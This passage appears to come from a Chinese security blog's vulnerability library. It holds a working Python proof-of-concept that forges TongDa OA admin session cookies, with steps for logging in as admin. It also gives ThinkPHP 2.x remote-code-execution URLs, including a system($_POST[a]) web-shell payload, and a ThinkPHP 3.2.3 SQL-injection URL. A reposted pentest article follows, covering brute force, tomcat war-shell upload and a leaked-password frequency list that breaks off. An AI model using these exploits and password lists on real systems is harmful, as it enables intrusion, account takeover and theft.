class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;&apos;</span><br><span class="line">@Author         : Sp4ce</span><br><span class="line">@Date           : 2020-03-17 23:42:16</span><br><span class="line">LastEditors    : Sp4ce</span><br><span class="line">LastEditTime   : 2020-08-27 10:21:44</span><br><span class="line">@Description    : Challenge Everything.</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">import requests</span><br><span class="line">from random import choice</span><br><span class="line">import argparse</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;,</span><br><span class="line">    &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)&quot;,</span><br><span class="line">    &quot;Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)&quot;,</span><br><span class="line">    &quot;Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20&quot;,</span><br><span class="line">    &quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)&quot;,</span><br><span class="line">    &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER&quot;,</span><br><span class="line">    &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)&quot;,</span><br><span class="line">    &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;,</span><br><span class="line">    &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)&quot;,</span><br><span class="line">    &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;,</span><br><span class="line">    &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&quot;,</span><br><span class="line">    &quot;Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">headers=&#123;&#125;</span><br><span class="line"></span><br><span class="line">def getV11Session(url):</span><br><span class="line">    checkUrl = url+&apos;/general/login_code.php&apos;</span><br><span class="line">    try:</span><br><span class="line">        headers[&quot;User-Agent&quot;] = choice(USER_AGENTS)</span><br><span class="line">        res = requests.get(checkUrl,headers=headers)</span><br><span class="line">        resText = str(res.text).split(&apos;&#123;&apos;)</span><br><span class="line">        codeUid = resText[-1].replace(&apos;&#125;&quot;&#125;&apos;, &apos;&apos;).replace(&apos;\r\n&apos;, &apos;&apos;)</span><br><span class="line">        getSessUrl = url+&apos;/logincheck_code.php&apos;</span><br><span class="line">        res = requests.post(</span><br><span class="line">            getSessUrl, data=&#123;&apos;CODEUID&apos;: &apos;&#123;&apos;+codeUid+&apos;&#125;&apos;, &apos;UID&apos;: int(1)&#125;,headers=headers)</span><br><span class="line">        tmp_cookie = res.headers[&apos;Set-Cookie&apos;]</span><br><span class="line">        headers[&quot;User-Agent&quot;] = choice(USER_AGENTS)</span><br><span class="line">        headers[&quot;Cookie&quot;] = tmp_cookie</span><br><span class="line">        check_available = requests.get(url + &apos;/general/index.php&apos;,headers=headers)</span><br><span class="line">        if &apos;用户未登录&apos; not in check_available.text:</span><br><span class="line">            if &apos;重新登录&apos; not in check_available.text:</span><br><span class="line">                print(&apos;[+]Get Available COOKIE:&apos; + tmp_cookie)</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;[-]Something Wrong With &apos; + url + &apos;,Maybe Not Vulnerable.&apos;)</span><br><span class="line">    except:</span><br><span class="line">        print(&apos;[-]Something Wrong With &apos;+url)</span><br><span class="line"></span><br><span class="line">def get2017Session(url):</span><br><span class="line">    checkUrl = url+&apos;/ispirit/login_code.php&apos;</span><br><span class="line">    try:</span><br><span class="line">        headers[&quot;User-Agent&quot;] = choice(USER_AGENTS)</span><br><span class="line">        res = requests.get(checkUrl,headers=headers)</span><br><span class="line">        resText = json.loads(res.text)</span><br><span class="line">        codeUid = resText[&apos;codeuid&apos;]</span><br><span class="line">        codeScanUrl = url+&apos;/general/login_code_scan.php&apos;</span><br><span class="line">        res = requests.post(codeScanUrl, data=&#123;&apos;codeuid&apos;: codeUid, &apos;uid&apos;: int(</span><br><span class="line">            1), &apos;source&apos;: &apos;pc&apos;, &apos;type&apos;: &apos;confirm&apos;, &apos;username&apos;: &apos;admin&apos;&#125;,headers=headers)</span><br><span class="line">        resText = json.loads(res.text)</span><br><span class="line">        status = resText[&apos;status&apos;]</span><br><span class="line">        if status == str(1):</span><br><span class="line">            getCodeUidUrl = url+&apos;/ispirit/login_code_check.php?codeuid=&apos;+codeUid</span><br><span class="line">            res = requests.get(getCodeUidUrl)</span><br><span class="line">            tmp_cookie = res.headers[&apos;Set-Cookie&apos;]</span><br><span class="line">            headers[&quot;User-Agent&quot;] = choice(USER_AGENTS)</span><br><span class="line">            headers[&quot;Cookie&quot;] = tmp_cookie</span><br><span class="line">            check_available = requests.get(url + &apos;/general/index.php&apos;,headers=headers)</span><br><span class="line">            if &apos;用户未登录&apos; not in check_available.text:</span><br><span class="line">                if &apos;重新登录&apos; not in check_available.text:</span><br><span class="line">                    print(&apos;[+]Get Available COOKIE:&apos; + tmp_cookie)</span><br><span class="line">            else:</span><br><span class="line">                print(&apos;[-]Something Wrong With &apos; + url + &apos;,Maybe Not Vulnerable.&apos;)</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;[-]Something Wrong With &apos;+url  + &apos; Maybe Not Vulnerable ?&apos;)</span><br><span class="line">    except:</span><br><span class="line">        print(&apos;[-]Something Wrong With &apos;+url)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        &quot;-v&quot;,</span><br><span class="line">        &quot;--tdoaversion&quot;,</span><br><span class="line">        type=int,</span><br><span class="line">        choices=[11, 2017],</span><br><span class="line">        help=&quot;Target TongDa OA Version. e.g: -v 11、-v 2017&quot;)</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        &quot;-url&quot;,</span><br><span class="line">        &quot;--targeturl&quot;,</span><br><span class="line">        type=str,</span><br><span class="line">        help=&quot;Target URL. e.g: -url 192.168.2.1、-url http://192.168.2.1&quot;</span><br><span class="line">    )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    url = args.targeturl</span><br><span class="line">    if &apos;http://&apos; not in url:</span><br><span class="line">        url = &apos;http://&apos; + url</span><br><span class="line">    if args.tdoaversion == 11:</span><br><span class="line">        getV11Session(url)</span><br><span class="line">    elif args.tdoaversion == 2017:</span><br><span class="line">        get2017Session(url)</span><br><span class="line">    else:</span><br><span class="line">        parser.print_help()</span><br></pre></td></tr></table></figure><ul><li>python3 poc.py -v 版本 -url url</li><li>运行并获取到可用的SESSIONID</li><li>替换浏览器Cookie中的SESSIONID即可实现登录为admin</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp 2.X RCE漏洞</title>
      <link href="/2020/08/26/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/08/26/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h3><p>Thinkphp 2.X</p><h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=/index/index/xxx/$&#123;@phpinfo()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://www.bylibrary.cn/wp-content/uploads/2020/08/GOVEV6Z1@EEJXNFNCB.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=/index/index/xxx/$&#123;@print(system($_POST[a]))&#125;</span><br></pre></td></tr></table></figure><p>菜刀连接,密码为a。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp</title>
      <link href="/2020/08/25/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/thinkphp%203.2.3RCE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/08/25/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/thinkphp%203.2.3RCE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Thinkphp &lt;= 3.2.3</p><h3 id="漏洞验证POC"><a href="#漏洞验证POC" class="headerlink" title="漏洞验证POC"></a>漏洞验证POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/home/user?money[]=1123&amp;user=liao&amp;id[0]=bind&amp;id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>谈谈对后台登录页面的渗透测试</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E8%B0%88%E8%B0%88%E5%AF%B9%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E8%B0%88%E8%B0%88%E5%AF%B9%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>本来是想写漏洞文章的，但是看见这篇文章，觉得这篇文章对渗透经验少的人可能会有点帮助，是可以让新手有所收获的文章，所以放上博客</p><h2 id="原文：谈谈对后台登录页面的渗透测试"><a href="#原文：谈谈对后台登录页面的渗透测试" class="headerlink" title="原文：谈谈对后台登录页面的渗透测试"></a>原文：<a href="https://www.anquanke.com/post/id/185426" target="_blank" rel="noopener">谈谈对后台登录页面的渗透测试</a></h2><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>有些朋友在渗透时扫描到后台登陆界面，却不知道如何入手。最近刚好在某公司做渗透实习，对目标固定的系统渗透有些体会。因此这里讲一下对网站后台登陆界面的渗透思路，希望能为大家提供一些帮助。</p><h2 id="0x01-开始"><a href="#0x01-开始" class="headerlink" title="0x01 开始"></a>0x01 开始</h2><p>本人在进入登陆界面时，一般都是先用万能密码什么的测下输入框有没有注入（现在很少见了）。如果没有，那就先拿admin，123456什么的测试下弱口令，不求运气爆棚一下就猜到密码。主要是看下回显，查看是否存在账号锁定策略，密码不正确，不存在此用户名等信息，以便于尝试遍历可能存在的用户名。没验证码就上爆破工具，有验证码的话看看能不能绕过,实在不行手工测几个账号密码碰碰运气。</p><h2 id="0x02-爆破"><a href="#0x02-爆破" class="headerlink" title="0x02 爆破"></a>0x02 爆破</h2><p>如果没验证码阻碍，那爆破没什么好说的，拿个好字典，直接干就是了。</p><p>不过注意下有时密码传输会使用md5或者base64之类的加密，这时除了自己写脚本外，可以使用burpsuite的intruder模块<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6thmeqhnfj30v10l2tap.jpg" alt><br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6thmw22wqj30uk0bxdgp.jpg" alt><br>爆破的传统思路都是固定账号爆破密码，还有一种姿势是固定密码爆破用户名。比如使用固定密码123456，爆破常用用户名或者常用人名拼音。</p><h2 id="0x03-扫目录"><a href="#0x03-扫目录" class="headerlink" title="0x03 扫目录"></a>0x03 扫目录</h2><p>目录扫描也是一个存在惊喜的地方，说不定能扫描到后台未授权访问的链接、备份文件、编辑器、敏感信息等。</p><p>像后台登陆的网址看多了，常规的路径像<a href="http://www.xxx.com/admin/login.aspx(.php)" target="_blank" rel="noopener">www.xxx.com/admin/login.aspx(.php)</a></p><p>老司机甚至不用御剑什么的工具跑，就能直接猜到。</p><p>一般碰到下面这种情况，可采用fuzz大法。一层一层fuzz，尝试寻找可利用的信息。漏洞银行有一期衬衫的视频fuzz讲得很好。他用的工具是wfuzz，感觉不错，感兴趣的可以去看看。<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6thndmouej30up0ekgnf.jpg" alt><br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thno21asj30tt0f1abo.jpg" alt></p><p><strong>这里给大家讲一下我做授权渗透的一个案列:</strong></p><p>一般给客户的后台系统做渗透，客户都会给个测试账号，除了测登陆界面外，还测下后台的功能模块。但这次当我问客户要账号密码时，客户回：你们不是要模拟黑客做渗透测试吗，那就自己打进去啊。( ╯□╰ )好吧，作为实习生的我也只能硬着头皮刚登陆界面了。</p><p>先看了下链接，发现是Java站，且链接是.do结尾，但struct2工具试了下没成功。<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tho3of7mj30uj08bgmz.jpg" alt><br>看了下登陆界面，有验证码，网站看去的版本也挺新的，感觉不太好搞。<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thoghp6aj30if096t9c.jpg" alt><br>测下注入无果，于是抓包看下验证码是否可以绕过或者不变，结果这个验证码很称职，爆破不了。验证码辨认还算清楚，不过验证码识别，总觉得不太靠谱。。。等绝望了找不到洞再试吧。于是去扫了下目录。诶，发现有好东西。<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thovfgsjj30au087767.jpg" alt><br>首先扫到了一个services服务路径<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thpfty87j30u10d276h.jpg" alt><br>知道了Apache Axis组件的版本信息<br><img src="https://imgchr.com/i/ntKnXQ" alt><br>然后马上想到这个组件当时刚爆出一个RCE漏洞</p><p>poc链接：<a href="https://github.com/KibodWapon/Axis-1.4-RCE-Poc" target="_blank" rel="noopener">https://github.com/KibodWapon/Axis-1.4-RCE-Poc</a></p><p>结果试了下没成功。然后再尝试了四月份CNVD看到的RCE漏洞也无果。</p><p>还扫出了一个ckfinder编辑器<br><a href="http://xxx.xxx.com/ckfinder/ckfinder.html" target="_blank" rel="noopener">http://xxx.xxx.com/ckfinder/ckfinder.html</a></p><p><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti4gao3lj30ty0cqwg5.jpg" alt><br>一看，我滴乖乖，难道已经有黑客搞进去了？</p><p>赶紧网上找了下这个版本有存在什么漏洞，并尝试文件上传绕过。但很遗憾，这个网站并不存在解析漏洞，利用不了，文件上传也没绕过。不过令人庆幸的是，黑客应该也没有利用成功。</p><p>。。。</p><p>又挖了一段时间，同事竟然说他拿shell了！</p><p>what?<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti4wgekgj308g083jtx.jpg" alt><br>发现他扫目录扫到了<a href="http://xxx.xx.com/manager/html" target="_blank" rel="noopener">http://xxx.xx.com/manager/html</a><br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti62iseaj30sw09l421.jpg" alt><br>然后一个admin/123456弱口令进入tomcat后台，然后传war包成功拿到shell<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6ti6h08nrj30pi07bt97.jpg" alt><br>看了这波操作久久无语，看来我的字典太差，tomcat目录都没扫出来。还有弱口令漏洞，真的很无敌。</p><h2 id="0x04-框架漏洞"><a href="#0x04-框架漏洞" class="headerlink" title="0x04 框架漏洞"></a>0x04 框架漏洞</h2><p>对一些CMS，已经比较成熟了，漏洞确实不好挖。如果网上（乌云，seebug，搜索引擎等）的历史漏洞没有复现成功，那一般情况下就只能寻找下逻辑漏洞、网站管理员配置错误或者弱口令什么的。</p><p>对于一些不知名的框架，一般也可通过登陆界面底下的声明中找到开发公司和产品版本时间。</p><p><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6ti7a4kvuj30g901sjrn.jpg" alt></p><p>在网上找找此公司产品是否爆出过漏洞。若是开源的框架，还可下载源码进行代码审计寻找漏洞。</p><p>像java的站，登陆页面是.do或.action的网址。可尝试下 struts2 命令执行漏洞，本人一般使用安恒的S2漏洞验证工具。<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6ti7r0kimj30vk0o4ak5.jpg" alt><br>又如thinkphp的CMS，可尝试下是否存在相应版本的命令执行漏洞。本人曾在邮储银行的一个系统登陆界面挖到tp5命令执行漏洞拿到shell，补天评了1700元。</p><p>emmmm,当然厂商说漏洞无影响给拒了就是另一回事了……<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6ti83uxffj307y05ojsk.jpg" alt></p><h2 id="0x05-弱口令"><a href="#0x05-弱口令" class="headerlink" title="0x05 弱口令"></a>0x05 弱口令</h2><p>可能有些小伙伴对弱口令嗤之以鼻，觉得它没有技术含量，但其实不然，结合社工，它的作用和危害可能比其他漏洞更大，希望大家重视。</p><p>刚巧最近有去公安厅复测6月HW的漏洞，检测漏洞是否修复。几十份报告，原以为要花很长时间，但结果却是：差不多半小时就完成了，且部分时间是花在输入网址上（报告不给拷到自己电脑上，只能看着公安厅电脑的报告手打网址）。</p><p>耗时少的其中一个原因是漏洞有八、九层的漏洞都是弱口令，其中大部分漏洞还都是部委级别的系统，所以测的很快。虽然hw期间比较特殊，还是比例这么大还是挺能说明问题的。</p><p><strong>以下是某大佬对14年底12306泄露密码的统计分析</strong></p><p>哈哈，可以发现我国还是对数字情有独钟，国外的top100弱口令还是不适合我大天朝的国情。很少有password,football之类的英文密码。</p><p>密码中包含有 123456 数字的，出现 3236 次<br>密码中包含有 123 数字的，出现 11213 次<br>密码中包含有 520 数字的，出现 4549 次<br>密码中包含有 1314 数字的，出现 3113 次<br>密码中包含有 aini 的，出现 877 次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">次数 密码</span><br><span class="line">392 123456</span><br><span class="line">281 a123456</span><br><span class="line">165 123456a</span><br><span class="line">161 5201314</span><br><span class="line">157 111111</span><br><span class="line">136 woaini1314</span><br><span class="line"> 98 qq123456</span><br><span class="line"> 98 123123</span><br><span class="line"> 97 000000</span><br><span class="line"> 93 1qaz2wsx</span><br><span class="line"> 83 1q2w3e4r</span><br><span class="line"> 80 qwe123</span><br><span class="line"> 76 7758521</span><br><span class="line"> 68 123qwe</span><br><span class="line"> 63 a123123</span><br><span class="line"> 56 woaini520</span><br><span class="line"> 55 123456aa</span><br><span class="line"> 52 1314520</span><br><span class="line"> 52 100200</span><br><span class="line"> 51 woaini</span><br><span class="line"> 50 woaini123</span><br><span class="line"> 50 123321</span><br><span class="line"> 49 q123456</span><br><span class="line"> 49 123456789</span><br><span class="line"> 48 asd123</span><br><span class="line"> 48 a123456789</span><br><span class="line"> 48 5211314</span><br><span class="line"> 48 123456789a</span><br><span class="line"> 47 z123456</span><br><span class="line"> 47 asd123456</span><br><span class="line"> 45 a5201314</span><br><span class="line"> 42 zhang123</span><br><span class="line"> 41 aa123456</span><br><span class="line"> 40 123123a</span><br><span class="line"> 38 aptx4869</span><br><span class="line"> 37 1qazxsw2</span><br><span class="line"> 37 1q2w3e4r5t</span><br><span class="line"> 36 5201314a</span><br><span class="line"> 35 aini1314</span><br><span class="line"> 35 1q2w3e</span><br><span class="line"> 34 woaini521</span><br><span class="line"> 34 q1w2e3r4</span><br><span class="line"> 34 31415926</span><br><span class="line"> 34 123456qq</span><br><span class="line"> 33 a111111</span><br><span class="line"> 33 520520</span><br><span class="line"> 33 1234qwer</span><br><span class="line"> 29 123456abc</span><br><span class="line"> 29 111111a</span><br><span class="line"> 29 110110</span><br><span class="line"> 28 w123456</span><br><span class="line"> 28 abc123</span><br><span class="line"> 28 7758258</span><br><span class="line"> 26 iloveyou</span><br><span class="line"> 26 159753</span><br><span class="line"> 25 qwer1234</span><br><span class="line"> 25 a000000</span><br><span class="line"> 24 zxc123</span><br><span class="line"> 24 123qweasd</span><br><span class="line"> 24 123654</span><br><span class="line"> 23 qq123123</span><br><span class="line"> 23 abc123456</span><br><span class="line"> 23 123456q</span><br><span class="line"> 22 qq5201314</span><br><span class="line"> 22 12345678</span><br><span class="line"> 21 456852</span><br><span class="line"> 21 000000a</span><br><span class="line"> 20 1314521</span><br><span class="line"> 19 zxc123456</span><br><span class="line"> 19 asdasd</span><br><span class="line"> 19 as123456</span><br><span class="line"> 19 666666</span><br><span class="line"> 19 521521</span><br><span class="line"> 19 112233</span><br><span class="line"> 18 q1w2e3</span><br><span class="line"> 18 